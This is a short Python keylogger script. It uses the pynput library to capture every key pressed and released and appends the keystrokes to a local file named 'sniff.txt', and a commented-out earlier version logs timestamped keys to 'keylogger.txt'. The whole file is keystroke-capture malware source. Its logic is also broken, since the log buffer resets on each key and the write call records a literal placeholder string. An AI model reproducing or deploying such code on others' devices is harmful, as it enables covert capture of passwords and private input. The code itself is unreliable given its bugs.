from pynput.keyboard import Listener , Key
from time import time, ctime

#f = open('keylogger.txt','a')

# def input(key):
#     log = []
#     log.append(key)
#     t = time()
#     if key == Key.esc:
#         f.close() 
#         quit()
#     f.writelines(ctime(t)+" : "+str(log)+"\n")

# def outside(key):
#     if key == Key.esc:
#         f.close() 
#         quit()

# with Listener(on_press=input) as listener:
#     listener.join()
# f = open('keylogger.txt', 'r')
# print(f.read()) 
# f.close()



f = open('sniff.txt','a+')

log = ""

def on_press(key):
    print("{0} pressed".format(key))
    

def on_release(key):
    log=''
    if key == Key.enter:
        f.write(f"{log}+'\n'".format("utf-8"))
        log=''
    elif key == Key.esc:
        f.close() 
        exit()
    else:
        log+= str(key) + ' '

with Listener(on_press=on_press , on_release=on_release) as listener:
    listener.join()

